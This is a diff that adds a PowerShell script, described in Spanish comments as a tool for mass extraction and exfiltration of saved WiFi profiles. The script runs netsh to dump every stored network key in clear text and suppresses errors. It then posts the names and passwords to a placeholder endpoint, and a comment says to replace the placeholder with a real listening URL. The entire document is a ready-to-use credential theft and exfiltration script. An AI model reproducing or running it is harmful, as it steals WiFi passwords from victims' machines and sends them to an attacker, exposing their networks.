@@ -1,0 +1,25 @@
+# Script original: Extracción masiva de perfiles WiFi y exfiltración
+# Nota: Endpoint anonimizado. Reemplazar [ENDPOINT_CONTROLADO] por la URL de escucha real para pruebas.
+
+$ErrorActionPreference = "SilentlyContinue"
+$out = ""
+$profiles = (netsh wlan show profiles) | Select-String ":"
+
+foreach ($p in $profiles) { 
+    try { 
+        $name = ($p.ToString().Split(":")[1]).Trim()
+        if ($name.Length -gt 0) { 
+            $pass = (netsh wlan show profile name="$name" key=clear) | Select-String "Contenido de la clave|Key Content"
+            if ($pass) { 
+                $val = ($pass.ToString().Split(":")[1]).Trim()
+                $out += "$name : $val `n" 
+            } else { 
+                $out += "$name : [Sin Clave] `n" 
+            } 
+        } 
+    } catch {} 
+}
+
+if ($out -eq "") { $out = "No se encontraron redes" }
+
+Invoke-RestMethod -Uri "https://[ENDPOINT_CONTROLADO]" -Method Post -Body $out
